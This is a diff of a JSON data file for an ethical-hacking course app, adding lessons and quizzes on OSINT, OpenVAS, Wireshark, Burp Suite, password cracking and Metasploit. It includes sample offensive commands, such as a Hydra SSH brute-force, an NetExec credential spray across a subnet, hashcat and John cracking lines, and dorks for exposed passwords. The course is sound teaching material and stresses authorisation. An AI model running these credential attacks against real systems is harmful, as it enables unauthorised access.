+                  "body": "'site:example.com' restricts results to a specific domain, 'filetype:pdf' finds files of a specific type, 'intitle:\"index of\"' finds exposed directory listings, 'inurl:admin' finds URLs containing a keyword like login/admin pages, and 'intext:\"password\"' finds pages containing a specific word in their body text."
+                },
+                {
+                  "id": "u8_m1_l4_c3",
+                  "title": "SpiderFoot & Censys",
+                  "body": "SpiderFoot automates OSINT collection, running 200+ modules against a target in one workflow and correlating findings automatically, flagging items like exposed credentials or leaked data. Censys, similar to Shodan, indexes internet-facing hosts and certificates for rapid discovery, and is especially useful for finding hosts by TLS/SSL certificate details. Automated tools speed up OSINT but should always be followed by manual verification."
+                }
+              ],
+              "quiz": {
+                "question": "Which Shodan search operator would find devices with RDP (port 3389) exposed?",
+                "options": [
+                  "site:3389",
+                  "port:3389",
+                  "filetype:3389",
+                  "intitle:3389"
+                ],
+                "correct_index": 1,
+                "explanation": "The 'port:' operator in Shodan searches for internet-connected devices that have a specific port open, such as 3389 for RDP."
+              }
+            },
+            {
+              "id": "u8_m1_l5",
+              "title": "Social OSINT, Utilities & Ethics",
+              "cards": [
+                {
+                  "id": "u8_m1_l5_c1",
+                  "title": "Sherlock & Additional Utilities",
+                  "body": "Sherlock is a command-line tool that searches for a given username across hundreds of platforms — run with 'sherlock username'. Other useful utilities: Amass (extensive subdomain enumeration from many sources), Sublist3r (fast subdomain enumeration via search engines and certificate transparency logs), FOCA (extracts metadata hidden inside public documents), and Metagoofil (harvests documents from a domain and extracts metadata like authors and software)."
+                },
+                {
+                  "id": "u8_m1_l5_c2",
+                  "title": "OSINT — Legal & Ethical Considerations",
+                  "body": "Gathering publicly available information is generally legal, but using it to harm or harass is not. Some jurisdictions restrict aggregating personal data even from public sources. Never use OSINT findings to attempt access, impersonation, or social engineering without authorisation. Document sources and methods carefully — professional OSINT work is auditable and defensible."
+                }
+              ],
+              "quiz": {
+                "question": "Is it always legal to use publicly gathered OSINT information for any purpose?",
+                "options": [
+                  "Yes, if the source was public, any use is automatically legal",
+                  "No — gathering public info is generally legal, but using it to harm, harass, or attack without authorisation is not",
+                  "OSINT is illegal in every country",
+                  "Only government agencies are allowed to use OSINT"
+                ],
+                "correct_index": 1,
+                "explanation": "The legality of the source (public data) does not guarantee the legality of the use — intent and action matter just as much as where the information came from."
+              }
             }
-          ],
-          "quiz": {
-            "question": "Which VMware network mode gives a VM its own IP address directly on the physical LAN?",
-            "options": [
-              "NAT",
-              "Host-Only",
-              "Bridged",
-              "Airplane Mode"
-            ],
-            "correct_index": 2,
-            "explanation": "Bridged mode makes the VM appear as a separate physical device on the LAN, which is required when other machines need to reach it at its own IP — like in this lab."
-          }
+          ]
         },
         {
-          "id": "u7_m2_l2",
-          "title": "VirtualBox & Choosing a Hypervisor",
-          "cards": [
+          "id": "u8_m2",
+          "title": "Vulnerability Scanning with OpenVAS",
+          "description": "Going beyond open ports to assess actual security weaknesses.",
+          "is_pro": false,
+          "lessons": [
             {
-              "id": "u7_m2_l2_c1",
-              "title": "VirtualBox Overview & Setup",
-              "body": "Oracle VM VirtualBox is a free, open-source virtualization platform available on Windows, Linux, and macOS hosts. Its feature set closely mirrors VMware: snapshots, virtual networking, shared folders, and cloning. The Extension Pack adds USB 3.0 support, disk encryption, and remote display. To install: download the installer, run it (accepting the temporary network disconnect), install the matching Extension Pack, confirm VT-x/AMD-V is enabled, then launch and click New to create a VM."
-            },
-            {
-              "id": "u7_m2_l2_c2",
-              "title": "VirtualBox Network Modes",
-              "body": "Bridged Adapter: connects directly to the physical LAN, getting its own IP (used for this lab). NAT: shares the host's connection but isn't reachable from other devices. NAT Network: like NAT but lets multiple VMs see each other. Host-Only Adapter: reaches only the host and other Host-Only VMs. Internal Network: VMs reach only each other, not even the host."
-            },
-            {
-              "id": "u7_m2_l2_c3",
-              "title": "VMware vs VirtualBox",
-              "body": "VMware Workstation generally offers faster 3D graphics and better performance for heavier guest OSes, a more polished snapshot/cloning UI, and is preferred in many enterprise environments (Player is free, Pro is paid). Oracle VirtualBox is completely free and open-source for all use cases, cross-platform with an identical experience everywhere, and has slightly simpler networking for beginners — an excellent choice for students and used interchangeably with VMware in this course."
+              "id": "u8_m2_l1",
+              "title": "OpenVAS Fundamentals",
+              "cards": [
+                {
+                  "id": "u8_m2_l1_c1",
+                  "title": "OpenVAS — Vulnerability Scanning Overview",
+                  "body": "OpenVAS (Open Vulnerability Assessment System) is a full-featured open-source vulnerability scanner. It automatically checks target systems against a huge, regularly updated database of known vulnerabilities, going beyond Nmap's port/service discovery to assess actual security weaknesses. It produces a detailed report ranking vulnerabilities by severity (Critical, High, Medium, Low), widely used by security teams to prioritise which issues to fix first."
+                },
+                {
+                  "id": "u8_m2_l1_c2",
+                  "title": "OpenVAS — Typical Workflow",
+                  "body": "1. Define Target: specify the IP/host to be scanned. 2. Select Scan Config: choose scan depth, e.g. full & fast. 3. Run the Scan: OpenVAS tests against its vulnerability database. 4. Review Report: findings are ranked by severity with remediation advice."
+                }
+              ],
+              "quiz": {
+                "question": "How does OpenVAS differ from Nmap?",
+                "options": [
+                  "They are identical tools",
+                  "OpenVAS finds open ports; Nmap checks for vulnerabilities",
+                  "Nmap discovers hosts and open ports; OpenVAS checks those discovered services against a database of known vulnerabilities",
+                  "OpenVAS only works on web applications"
+                ],
+                "correct_index": 2,
+                "explanation": "Nmap answers 'what's open?' while OpenVAS answers 'given what's open, what's actually vulnerable?' — the two tools are complementary."
+              }
             }
-          ],
-          "quiz": {
-            "question": "Which statement about VirtualBox is accurate?",
-            "options": [
-              "It only runs on Windows",
-              "It is completely free and open-source for all use cases",
-              "It cannot support Bridged networking",
-              "It requires a paid license for students"
-            ],
-            "correct_index": 1,
-            "explanation": "Unlike VMware Pro, VirtualBox is completely free and open-source, making it an excellent choice for students building a home lab."
-          }
+          ]
+        },
+        {
+          "id": "u8_m3",
+          "title": "Packet Analysis with Wireshark",
+          "description": "Inspecting the actual content and behaviour of network traffic, packet by packet.",
+          "is_pro": false,
+          "lessons": [
+            {
+              "id": "u8_m3_l1",
+              "title": "Wireshark Fundamentals",
+              "cards": [
+                {
+                  "id": "u8_m3_l1_c1",
+                  "title": "Wireshark — Packet Analysis Overview",
+                  "body": "Wireshark is the world's most widely used network protocol analyser ('packet sniffer'). It captures and displays every packet travelling across a network interface in real time, letting you inspect the actual content and headers of network traffic in detail. It's used to troubleshoot networks, analyse attacks, and verify whether traffic is actually encrypted."
+                },
+                {
+                  "id": "u8_m3_l1_c2",
+                  "title": "Wireshark Interface Overview",
+                  "body": "Packet List Pane: a summary row for every captured packet (number, time, source, destination, protocol). Packet Details Pane: expands the selected packet into its protocol layers (Ethernet, IP, TCP, application). Packet Bytes Pane: shows the raw hexadecimal and ASCII bytes. The toolbar gives quick access to start/stop capture and apply filters, while the status bar shows capture file details and packet counts."
+                }
+              ],
+              "quiz": {
+                "question": "What does Wireshark's Packet Bytes Pane show?",
+                "options": [
+                  "A summary list of every packet",
+                  "The raw hexadecimal and ASCII bytes of the selected packet",
+                  "Only the packet's source IP address",
+                  "A graph of traffic volume over time"
+                ],
+                "correct_index": 1,
+                "explanation": "The Packet Bytes Pane shows the actual raw data of the selected packet in both hex and ASCII form — the most detailed of Wireshark's three panes."
+              }
+            },
+            {
+              "id": "u8_m3_l2",
+              "title": "Capture & Display Filters",
+              "cards": [
+                {
+                  "id": "u8_m3_l2_c1",
+                  "title": "Capture Filters",
+                  "body": "Capture filters decide what gets recorded in the first place: 'host 192.168.1.5' captures only traffic to/from a specific IP, 'net 192.168.1.0/24' captures only traffic within a subnet, 'port 80' captures only traffic on a specific port, 'tcp' captures only TCP traffic, and 'not arp' excludes ARP traffic."
+                },
+                {
+                  "id": "u8_m3_l2_c2",
+                  "title": "Display Filters",
+                  "body": "Display filters narrow what's shown from an already-captured file: 'http.request.method == \"POST\"' shows only HTTP POST requests, 'tcp.flags.syn == 1 && tcp.flags.ack == 0' shows only SYN packets (connection attempts), 'tcp.analysis.retransmission' highlights retransmitted packets, 'ftp' shows FTP control traffic (useful for spotting plaintext credentials), and 'tcp.port == 4444' shows traffic on a port often associated with reverse shells."
+                }
+              ],
+              "quiz": {
+                "question": "What is the key difference between a Capture Filter and a Display Filter in Wireshark?",
+                "options": [
+                  "There is no difference, they're the same thing",
+                  "Capture filters decide what gets recorded; display filters narrow what's shown from already-captured data",
+                  "Display filters can only be used on saved files, never live",
+                  "Capture filters only work on HTTP traffic"
+                ],
+                "correct_index": 1,
+                "explanation": "Capture filters apply before data is saved (reducing what's recorded), while display filters apply afterward, letting you narrow your view of already-captured packets."
+              }
+            },
+            {
+              "id": "u8_m3_l3",
+              "title": "Streams, Handshakes & Attack Detection",
+              "cards": [
+                {
+                  "id": "u8_m3_l3_c1",
+                  "title": "Following TCP & HTTP Streams",
+                  "body": "Right-click any packet and choose 'Follow → TCP Stream' to reassemble all packets in a session into one readable conversation, in the order sent and received. This is effective for spotting plaintext credentials sent over unencrypted HTTP or FTP sessions, and colour-codes client and server data separately. 'Follow → HTTP Stream' works similarly for full request/response pairs."
+                },
+                {
+                  "id": "u8_m3_l3_c2",
+                  "title": "The TCP 3-Way Handshake",
+                  "body": "1. SYN: the client sends a SYN packet to initiate a connection. 2. SYN-ACK: the server responds, acknowledging and agreeing to connect. 3. ACK: the client sends a final ACK, and the connection is established. 4. Data Transfer: application data begins flowing once the handshake completes."
+                },
+                {
+                  "id": "u8_m3_l3_c3",
+                  "title": "Detecting Attacks in Wireshark",
+                  "body": "Port Scan: a burst of SYN packets to many ports from one source with few completed handshakes. ARP Spoofing: duplicate or conflicting ARP replies mapping one IP to multiple MAC addresses. SYN Flood (DoS): an overwhelming volume of SYN packets with no completed handshakes. DNS Spoofing: unexpected or duplicate DNS responses for the same query. Credential Sniffing: plaintext HTTP POST or FTP/Telnet traffic containing usernames/passwords."
+                }
+              ],
+              "quiz": {
+                "question": "What pattern in Wireshark most strongly suggests an ARP spoofing attack?",
+                "options": [
+                  "A single DNS query",
+                  "Duplicate or conflicting ARP replies mapping one IP to multiple MAC addresses",
+                  "A completed TCP handshake",
+                  "One HTTP GET request"
+                ],
+                "correct_index": 1,
+                "explanation": "ARP spoofing works by sending conflicting ARP replies that map an IP address to a different (attacker-controlled) MAC address, which shows up as duplicate/conflicting entries."
+              }
+            },
+            {
+              "id": "u8_m3_l4",
+              "title": "tshark, Colors & Statistics",
+              "cards": [
+                {
+                  "id": "u8_m3_l4_c1",
+                  "title": "tshark — Command-Line Wireshark",
+                  "body": "'tshark -i eth0' starts a live capture on interface eth0. 'tshark -r capture.pcap' reads and displays packets from a saved file. 'tshark -Y \"http\"' applies a display filter while reading. 'tshark -i eth0 -w out.pcap' captures live traffic and writes it to a file. 'tshark -r cap.pcap -T fields -e ip.src' extracts specific fields for scripting."
+                },
+                {
+                  "id": "u8_m3_l4_c2",
+                  "title": "Colour Coding & Statistics Views",
+                  "body": "Wireshark colour-codes packets: Light Purple (TCP), Light Blue (UDP), Black with Red Text (checksum errors), Light Green (HTTP), Yellow (unusual TCP flags). Statistics views turn a raw capture into a high-level picture: Protocol Hierarchy breaks the capture down by protocol percentage, Conversations shows every pair of communicating hosts, Endpoints lists every IP/MAC seen, and IO Graph plots traffic volume over time — useful for spotting DoS activity."
+                }
+              ],
+              "quiz": {
+                "question": "Which Wireshark Statistics view would be most useful for spotting a sudden traffic spike, like a DoS attack?",
+                "options": [
+                  "Protocol Hierarchy",
+                  "IO Graph",
+                  "Endpoints",
+                  "Packet Bytes Pane"
+                ],
+                "correct_index": 1,
+                "explanation": "The IO Graph plots traffic volume over time, making sudden spikes — a hallmark of DoS activity — immediately visible."
+              }
+            }
+          ]
+        },
+        {
+          "id": "u8_m4",
+          "title": "Web App Testing with Burp Suite",
+          "description": "The industry-standard intercepting proxy for finding web application vulnerabilities.",
+          "is_pro": false,
+          "lessons": [
+            {
+              "id": "u8_m4_l1",
+              "title": "Burp Suite Overview & Setup",
+              "cards": [
+                {
+                  "id": "u8_m4_l1_c1",
+                  "title": "Overview & Key Modules",
+                  "body": "Burp Suite is the industry-standard toolkit for testing web application security, working as an intercepting proxy that sits between your browser and the target website. Key modules: Proxy (intercepts and lets you inspect/modify traffic), Scanner (automatically crawls and scans for vulnerabilities, Pro only), Intruder (automates sending many customised requests), and Repeater (lets you manually resend and tweak individual requests)."
+                },
+                {
+                  "id": "u8_m4_l1_c2",
+                  "title": "Proxy & CA Certificate Setup",
+                  "body": "Set the browser's proxy settings to point to Burp's listener, typically 127.0.0.1:8080. Visit http://burp within the proxied browser to download Burp's CA certificate, then install it into the browser's trust store to intercept HTTPS without warnings. Use FoxyProxy or similar to quickly toggle the proxy on and off, and always remove Burp's proxy settings when testing is finished."
+                }
+              ],
+              "quiz": {
+                "question": "Why does Burp Suite need its CA certificate installed in the browser's trust store?",
+                "options": [
+                  "To speed up browsing",
+                  "To let Burp intercept and read encrypted HTTPS traffic without browser warnings",
+                  "It's required for the Proxy module to even start",
+                  "To block ads while testing"
+                ],
+                "correct_index": 1,
+                "explanation": "Trusting Burp's CA certificate is what allows it to decrypt and inspect HTTPS traffic during a proxied session, without the browser flagging it as untrusted."
+              }
+            },
+            {
+              "id": "u8_m4_l2",
+              "title": "Target, Scope & Repeater",
+              "cards": [
+                {
+                  "id": "u8_m4_l2_c1",
+                  "title": "Target, Site Map & Scope",
+                  "body": "The Target tab builds a live Site Map of every page and endpoint visited through the proxy. Defining Scope focuses Burp's tools on only the target application, filtering unrelated traffic — right-click any host and choose 'Add to scope' to narrow focus quickly. Keeping scope tight avoids accidentally testing systems outside the authorised engagement."
+                },
+                {
+                  "id": "u8_m4_l2_c2",
+                  "title": "Burp Repeater — Step-by-Step Workflow",
+                  "body": "1. Send to Repeater: right-click any captured request in Proxy history. 2. Modify the Request: edit parameters, headers, or the body to test a hypothesis. 3. Send & Observe: send the modified request and inspect the server's response. 4. Iterate: refine the request repeatedly to confirm and narrow down a vulnerability."
+                }
+              ],
+              "quiz": {
+                "question": "Why is it important to keep Burp Suite's Scope tightly defined during a test?",
+                "options": [
+                  "It makes the proxy run faster",
+                  "It avoids accidentally testing systems outside the authorised engagement",
+                  "It's required for Repeater to function",
+                  "It hides your IP address"
+                ],
+                "correct_index": 1,
+                "explanation": "A clear, tight scope keeps all testing focused only on the authorised target, preventing accidental (and illegal) testing of unrelated systems."
+              }
+            },
+            {
+              "id": "u8_m4_l3",
+              "title": "Intruder Attack Types",
+              "cards": [
+                {
+                  "id": "u8_m4_l3_c1",
+                  "title": "Sniper & Battering Ram",
+                  "body": "Sniper: one payload set, testing each position in turn — good for fuzzing a single parameter. Battering Ram: one payload set, inserting the same value into all positions simultaneously."
+                },
+                {
+                  "id": "u8_m4_l3_c2",
+                  "title": "Pitchfork & Cluster Bomb",
+                  "body": "Pitchfork: multiple payload sets in parallel, one value per position, matched by list order. Cluster Bomb: multiple payload sets, testing every combination of them — ideal for login brute-forcing where you want to try every username against every password."
+                }
+              ],
+              "quiz": {
+                "question": "Which Burp Intruder attack type would be best for brute-forcing a login form by trying every username against every password?",
+                "options": [
+                  "Sniper",
+                  "Battering Ram",
+                  "Pitchfork",
+                  "Cluster Bomb"
+                ],
+                "correct_index": 3,
+                "explanation": "Cluster Bomb tests every combination of multiple payload sets, making it ideal for trying every username-password pairing during a login brute-force."
+              }
+            },
+            {
+              "id": "u8_m4_l4",
+              "title": "Decoder, Comparer, Sequencer & Vulnerability Testing",
+              "cards": [
+                {
+                  "id": "u8_m4_l4_c1",
+                  "title": "Decoder, Comparer & Sequencer",
+                  "body": "Decoder encodes and decodes data using common schemes — Base64, URL encoding, HTML entities, hashing. Comparer performs a byte-by-byte or word-by-word diff between two requests, responses, or values. Sequencer analyses the randomness and predictability of tokens like session IDs or CSRF tokens. All three are available in the free Community Edition."
+                },
+                {
+                  "id": "u8_m4_l4_c2",
+                  "title": "Testing Common Web Vulnerabilities",
+                  "body": "SQL Injection: modify query parameters and observe error/behavioural changes (Repeater/Intruder). Cross-Site Scripting (XSS): inject script payloads and check if they render unsanitised (Repeater). Broken Authentication: test login forms with credential lists (Intruder). Insecure Direct Object Reference: change ID parameters to check for unauthorised access (Repeater). CSRF: inspect requests for missing or predictable anti-CSRF tokens (Sequencer/Proxy)."
+                }
+              ],
+              "quiz": {
+                "question": "Which Burp Suite tool would you use to check whether a website's session ID tokens are predictable?",
+                "options": [
+                  "Decoder",
+                  "Sequencer",
+                  "Comparer",
+                  "Repeater"
+                ],
+                "correct_index": 1,
+                "explanation": "Sequencer is specifically designed to analyse the randomness and predictability of tokens like session IDs or CSRF tokens."
+              }
+            },
+            {
+              "id": "u8_m4_l5",
+              "title": "Extensions & Editions",
+              "cards": [
+                {
+                  "id": "u8_m4_l5_c1",
+                  "title": "Burp Extensions & the BApp Store",
+                  "body": "The BApp Store hosts community-built extensions that add new functionality to Burp Suite, accessible from the Extender tab. Popular extensions include Autorize (authorisation testing) and Logger++ (advanced traffic logging). Extensions run on Java; the Professional edition also supports Python/Ruby via Jython/JRuby, and can automate repetitive checks to save significant time."
+                },
+                {
+                  "id": "u8_m4_l5_c2",
+                  "title": "Community vs Professional",
+                  "body": "Proxy, Repeater, and Decoder are available in both editions. The Automated Vulnerability Scanner is Professional only. Intruder is heavily rate-limited in Community but runs at full speed in Professional. Project Saving isn't available in Community but is supported in Professional. Community is free; Professional requires an annual licence."
+                }
+              ],
+              "quiz": {
+                "question": "What is a key practical limitation of Burp Suite's Community Edition compared to Professional?",
+                "options": [
+                  "It cannot use the Proxy module at all",
+                  "Intruder is heavily rate-limited, and there's no automated vulnerability scanner",
+                  "It cannot intercept any traffic",
+                  "It has no Repeater module"
+                ],
+                "correct_index": 1,
+                "explanation": "Community Edition includes core modules like Proxy and Repeater, but Intruder is rate-limited and the automated Scanner is Professional-only."
+              }
+            }
+          ]
+        },
+        {
+          "id": "u8_m5",
+          "title": "Comparing the Full Scanning Toolkit",
+          "description": "Choosing the right tool for the right job during the scanning phase.",
+          "is_pro": false,
+          "lessons": [
+            {
+              "id": "u8_m5_l1",
+              "title": "Choosing the Right Tool",
+              "cards": [
+                {
+                  "id": "u8_m5_l1_c1",
+                  "title": "Comparing the Scanning Toolkit",
+                  "body": "Nmap: discovering hosts, open ports, and running services across a network. OpenVAS: automatically identifying known vulnerabilities in discovered services. Wireshark: inspecting the actual content and behaviour of network traffic. Burp Suite: testing the security of web applications specifically. Each tool has a distinct specialisation — real assessments typically use several together."
+                },
+                {
+                  "id": "u8_m5_l1_c2",
+                  "title": "Full Toolkit Quick Reference",
+                  "body": "WHOIS (whois example.com): domain registration lookup. Nmap (nmap -sV -A example.com): combined version, OS & script scan. Wireshark/tshark (tshark -i eth0 -Y http): live HTTP traffic inspection. Burp Suite (Proxy: 127.0.0.1:8080): intercept & test web traffic. Maltego (Domain entity → To DNS Name): visual infrastructure mapping. theHarvester (theharvester -d example.com -b all): email & subdomain harvesting."
+                }
+              ],
+              "quiz": {
+                "question": "Which tool is most specialised for testing web application security specifically, rather than general network scanning?",
+                "options": [
+                  "Nmap",
+                  "OpenVAS",
+                  "Burp Suite",
+                  "WHOIS"
+                ],
+                "correct_index": 2,
+                "explanation": "While Nmap and OpenVAS handle network/host and vulnerability discovery broadly, Burp Suite is purpose-built for web application security testing."
+              }
+            }
+          ]
         }
       ]
     },
     {
-      "id": "u7_m3",
-      "title": "Setting Up the Lab Machines",
-      "description": "Installing the attacker VM, the target VM, and the deliberately vulnerable machine.",
-      "is_pro": false,
-      "lessons": [
+      "id": "unit_09",
+      "title": "Unit 9: Gaining Access, Maintaining Access, Covering Tracks & Social Engineering",
+      "description": "Completing the ethical hacking lifecycle — exploitation, password cracking, Metasploit, persistence, anti-forensics, malware, and social engineering awareness.",
+      "modules": [
         {
-          "id": "u7_m3_l1",
-          "title": "Installing Kali Linux",
-          "cards": [
+          "id": "u9_m1",
+          "title": "Gaining Access: Exploits & Password Cracking",
+          "description": "Turning a discovered vulnerability into real, working access.",
+          "is_pro": false,
+          "lessons": [
             {
-              "id": "u7_m3_l1_c1",
-              "title": "Kali as a Virtual Machine",
-              "body": "Use the official pre-built VMware/VirtualBox image for the fastest, most reliable setup: download the Kali image (.7z) from kali.org/get-kali, extract it to reveal the .vmx or .vbox/.vdi files, import/open it in your hypervisor, allocate at least 4GB RAM and 2 CPU cores, then power on and log in with default credentials kali/kali before changing the password immediately."
+              "id": "u9_m1_l1",
+              "title": "What is Gaining Access?",
+              "cards": [
+                {
+                  "id": "u9_m1_l1_c1",
+                  "title": "The Third Phase",
+                  "body": "Gaining Access is the third phase of ethical hacking — actually exploiting a discovered vulnerability to enter a system. It builds directly on the Scanning phase's findings and is the point where a test moves from 'what's exposed' to 'what can actually be exploited'. Success proves a vulnerability is real, not just theoretical. It's the most legally sensitive phase — always requires explicit, written authorisation."
+                },
+                {
+                  "id": "u9_m1_l1_c2",
+                  "title": "Types of Exploits",
+                  "body": "Remote Exploit: attacks a vulnerability over a network without prior access. Local Exploit: requires existing limited access, used to escalate privileges. Client-Side Exploit: targets vulnerabilities in client applications (browsers, PDF readers) via user interaction. Server-Side Exploit: directly targets a vulnerable service running on a server."
+                },
+                {
+                  "id": "u9_m1_l1_c3",
+                  "title": "From Vulnerability to Access",
+                  "body": "The typical flow: 1. Vulnerability Found (Scanning identifies a weakness). 2. Select Exploit (choose a matching exploit/technique). 3. Configure Payload (prepare what runs after access is gained). 4. Launch Exploit (execute against the authorised target). 5. Access Gained (a session/shell on the target is established)."
+                }
+              ],
+              "quiz": {
+                "question": "What is the key difference between a Remote Exploit and a Local Exploit?",
+                "options": [
+                  "Remote exploits only work on web browsers",
+                  "A Remote Exploit attacks over the network without prior access; a Local Exploit requires existing limited access to escalate privileges",
+                  "There is no difference",
+                  "Local exploits only target servers"
+                ],
+                "correct_index": 1,
+                "explanation": "Remote exploits gain initial access from outside the system, while local exploits are used to escalate privileges once some access already exists."
+              }
             },
             {
-              "id": "u7_m3_l1_c2",
-              "title": "First Boot & Post-Install Setup",
-              "body": "Immediately run 'sudo apt update && sudo apt full-upgrade' to bring the system current. Change the default password with 'passwd'. Install VMware Tools/Guest Additions for better display and clipboard support. Take a clean snapshot right after setup as your 'known good' restore point. Confirm networking is set to Bridged mode so Kali gets its own IP on the lab network."
+              "id": "u9_m1_l2",
+              "title": "Password Cracking Fundamentals",
+              "cards": [
+                {
+                  "id": "u9_m1_l2_c1",
+                  "title": "Password Cracking Overview & Techniques",
+                  "body": "Password cracking recovers passwords from stored or captured data — often the weakest link. Techniques: Brute Force (systematically tries every character combination), Dictionary Attack (tries common words and known leaked passwords), Rainbow Table Attack (uses precomputed hash tables to reverse-lookup a password), and Hybrid Attack (combines dictionary words with common variations like added numbers/symbols)."
+                },
+                {
+                  "id": "u9_m1_l2_c2",
+                  "title": "Online vs Offline Password Attacks",
+                  "body": "Online attacks target a live login service (e.g. SSH, web login) — slower, limited by network and lockout policies, and often logged (example tool: Hydra). Offline attacks target a stolen/captured password hash file — much faster, limited only by computing power, and invisible to the target once the hash is obtained (example tools: John the Ripper, Hashcat)."
+                }
+              ],
+              "quiz": {
+                "question": "Why are offline password attacks generally faster than online attacks?",
+                "options": [
+                  "Offline attacks use less electricity",
+                  "Offline attacks are limited only by computing power, not by network speed or account lockout policies",
+                  "Online attacks always use stronger encryption",
+                  "There's no actual speed difference"
+                ],
+                "correct_index": 1,
+                "explanation": "Offline attacks work against a captured hash file locally, so they aren't slowed by network latency or protected by account lockout mechanisms the way online attacks against a live service are."
+              }
             },
             {
-              "id": "u7_m3_l1_c3",
-              "title": "Essential Pen-Testing Commands",
-              "body": "'ip a' confirms the IP address Kali received. 'sudo netdiscover -r <subnet>' discovers live hosts on the local subnet. 'nmap -sn <subnet>' ping-sweeps a subnet. 'nmap -sV -p- <target-ip>' runs a full port scan with service detection. 'msfconsole' launches the Metasploit Framework. 'searchsploit <keyword>' searches the local Exploit-DB copy for known exploits."
+              "id": "u9_m1_l3",
+              "title": "Password Cracking Tools",
+              "cards": [
+                {
+                  "id": "u9_m1_l3_c1",
+                  "title": "John the Ripper",
+                  "body": "A versatile offline password cracker supporting many hash formats. 'john hashes.txt' cracks using default settings. 'john --wordlist=rockyou.txt hashes.txt' runs a dictionary attack. 'john --show hashes.txt' displays already-cracked passwords. 'john --incremental hashes.txt' runs a full brute-force. Format flags like '--format=nt' (Windows NTLM) or '--format=bcrypt' target specific hash types."
+                },
+                {
+                  "id": "u9_m1_l3_c2",
+                  "title": "Hashcat",
+                  "body": "An extremely fast, GPU-accelerated password recovery tool. Attack modes: -a 0 (straight dictionary attack), -a 1 (combination of two wordlists), -a 3 (brute-force/mask attack), -a 6/-a 7 (hybrid wordlist+mask combinations). Example: 'hashcat -m 0 -a 0 hashes.txt rockyou.txt' runs a dictionary attack against MD5 hashes (mode 0)."
+                },
+                {
+                  "id": "u9_m1_l3_c3",
+                  "title": "Hydra & Alternative Brute-Force Tools",
+                  "body": "Hydra is an online password-guessing tool: 'hydra -l admin -P rockyou.txt ssh://192.168.1.10' brute-forces an SSH login. Medusa is a fast, parallel, modular alternative supporting many services. Ncrack, built by the Nmap team, focuses on network authentication testing at scale and integrates naturally with Nmap output. CrackMapExec/NetExec tests credentials across entire subnets, e.g. 'nxc smb 192.168.1.0/24 -u admin -p Password123'."
+                }
+              ],
+              "quiz": {
+                "question": "Which tool is specifically designed for GPU-accelerated offline password cracking?",
+                "options": [
+                  "Hydra",
+                  "Hashcat",
+                  "WHOIS",
+                  "Wireshark"
+                ],
+                "correct_index": 1,
+                "explanation": "Hashcat is built to leverage GPU acceleration, making it extremely fast for offline hash cracking compared to CPU-based tools."
+              }
+            },
+            {
+              "id": "u9_m1_l4",
+              "title": "Rainbow Tables & Ethical Boundaries",
+              "cards": [
+                {
+                  "id": "u9_m1_l4_c1",
+                  "title": "Ophcrack & Rainbow Tables",
+                  "body": "Ophcrack is a free tool specialised in cracking Windows passwords using precomputed rainbow tables, which trade disk space for speed by avoiding repeated hash computation. It comes with free tables for older LM hashes, with larger tables available for purchase. Modern Windows systems (NTLM with salting-like protections) are far more resistant than legacy LM hashes — salting is why rainbow table attacks are largely defeated on modern systems."
+                },
+                {
+                  "id": "u9_m1_l4_c2",
+                  "title": "Password Cracking — Ethical Use & Legal Boundaries",
+                  "body": "Legitimate use is auditing your own organisation's password strength with proper authorisation. Cracking passwords you don't own or lack permission to test is a criminal offence. Even in authorised tests, cracked passwords must be handled confidentially. Practice only against your own accounts or designated lab material — this is exactly why strong, unique passwords matter so much."
+                }
+              ],
+              "quiz": {
+                "question": "Why are rainbow table attacks largely defeated on modern Windows systems?",
+                "options": [
+                  "Modern Windows doesn't use passwords at all",
+                  "Salting-like protections on NTLM make precomputed tables far less effective than on legacy LM hashes",
+                  "Rainbow tables no longer exist",
+                  "Windows blocks all password cracking tools automatically"
+                ],
+                "correct_index": 1,
+                "explanation": "Salting adds unique data to each password before hashing, which defeats the whole point of a precomputed rainbow table lookup."
+              }
             }
-          ],
-          "quiz": {
-            "question": "What should you do immediately after Kali's first boot, before anything else?",
-            "options": [
-              "Start scanning other networks",
-              "Run a full system update and change the default password",
-              "Delete the default user account",
-              "Disable the network adapter"
-            ],
-            "correct_index": 1,
-            "explanation": "Updating the system and changing the default kali/kali password are essential first steps — leaving default credentials in place is a serious security risk."
-          }
+          ]
         },
         {
-          "id": "u7_m3_l2",
-          "title": "Windows 7 Target Machine",
-          "cards": [
+          "id": "u9_m2",
+          "title": "Gaining Access: Metasploit & Exploitation Tools",
+          "description": "Using the industry-standard exploitation framework and its supporting tools.",
+          "is_pro": false,
+          "lessons": [
             {
-              "id": "u7_m3_l2_c1",
-              "title": "Setting Up Windows 7",
-              "body": "Windows 7 is used as a legacy, deliberately-unpatched target for safe exploitation practice. Steps: obtain a licensed ISO/product key, create a new VM (Windows 7, 2GB+ RAM, 40GB disk), install Windows from the ISO, install Guest Tools for better integration, then set the network adapter to Bridged so it joins the same lab subnet as Kali."
+              "id": "u9_m2_l1",
+              "title": "Metasploit Deep Dive",
+              "cards": [
+                {
+                  "id": "u9_m2_l1_c1",
+                  "title": "Core Components",
+                  "body": "Exploit: code that takes advantage of a specific vulnerability. Payload: code that runs on the target after successful exploitation. Auxiliary Module: supporting functions like scanning, fuzzing, or denial-of-service testing. Encoder: helps a payload avoid detection by security tools, used carefully and ethically."
+                },
+                {
+                  "id": "u9_m2_l1_c2",
+                  "title": "Payloads & Meterpreter",
+                  "body": "A payload defines what happens once an exploit succeeds — from a simple command shell to full control. Meterpreter is Metasploit's advanced payload: an interactive, in-memory post-exploitation tool allowing file system navigation, screenshots, and system information gathering. It runs entirely in memory, making it harder to detect than traditional disk-based payloads."
+                },
+                {
+                  "id": "u9_m2_l1_c3",
+                  "title": "A Sample Metasploit Workflow",
+                  "body": "1. search — find a module for the known vulnerability. 2. use — select the exploit module. 3. set RHOSTS — configure the authorised target IP. 4. set PAYLOAD — choose what runs after exploitation. 5. exploit — launch against the authorised lab target."
+                }
+              ],
+              "quiz": {
+                "question": "Why is Meterpreter considered harder to detect than a traditional payload?",
+                "options": [
+                  "It uses a different color scheme",
+                  "It runs entirely in memory rather than being written to disk",
+                  "It doesn't communicate with the attacker at all",
+                  "It only works on Linux"
+                ],
+                "correct_index": 1,
+                "explanation": "Because Meterpreter operates in-memory rather than writing files to disk, it leaves fewer traditional forensic traces for antivirus and disk-scanning tools to catch."
+              }
             },
             {
-              "id": "u7_m3_l2_c2",
-              "title": "Configuration Notes",
